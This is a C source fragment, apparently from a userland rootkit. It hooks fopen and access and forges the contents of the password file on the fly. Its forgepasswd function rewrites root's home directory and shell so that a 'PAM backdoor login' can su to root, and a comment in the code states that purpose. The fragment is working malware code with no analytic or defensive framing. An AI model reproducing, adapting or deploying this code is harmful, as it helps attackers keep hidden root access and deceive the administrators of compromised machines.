void sncatbuf(char *buf, size_t bufsize, char *string){
    char tmp[strlen(string)+2];
    snprintf(tmp, sizeof(tmp), "%s:", string);
    strncat(buf, tmp, bufsize);
}

/* this function is called when su'ing to root on PAM backdoor login.
 * if ever root does not have a login shell, that will not be an issue. */
FILE *forgepasswd(const char *pathname){
    FILE *fp, *tmp;
    char line[LINE_MAX], *linedup,
         *ptok, *goodshell=NULL;
    int cur=0;

    hook(CFOPEN, CACCESS);

    fp = call(CFOPEN, pathname, "r");
    if(fp == NULL)
        return NULL;

    for(int i=0; i < GOODSHELLS_SIZE; i++){
        if((long)call(CACCESS, goodshells[i], F_OK) == 0){
            goodshell = goodshells[i];
            break;
        }
    }

    if(goodshell == NULL)
        return fp;

    tmp = tmpfile();
    if(tmp == NULL)
        return fp;

    memset(line, 0, sizeof(line));
    while(fgets(line, sizeof(line), fp) != NULL){
        if(!strncmp("root:", line, 5)){
            char myline[strlen(line)+32];
            memset(myline, 0, sizeof(myline));

            linedup = strdup(line);
            ptok = strtok(linedup, ":");
            while(ptok != NULL){
                if(cur == 5)
                    sncatbuf(myline, sizeof(myline), HOMEDIR);
                else if(cur == 6)
                    sncatbuf(myline, sizeof(myline), goodshell);
                else
                    sncatbuf(myline, sizeof(myline), ptok);

                ptok = strtok(NULL, ":");
                cur++;
            }
            free(linedup);

            myline[strlen(myline)-1]='\n';
            fputs(myline, tmp);
        }else fputs(line, tmp);
    }

    fclose(fp);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}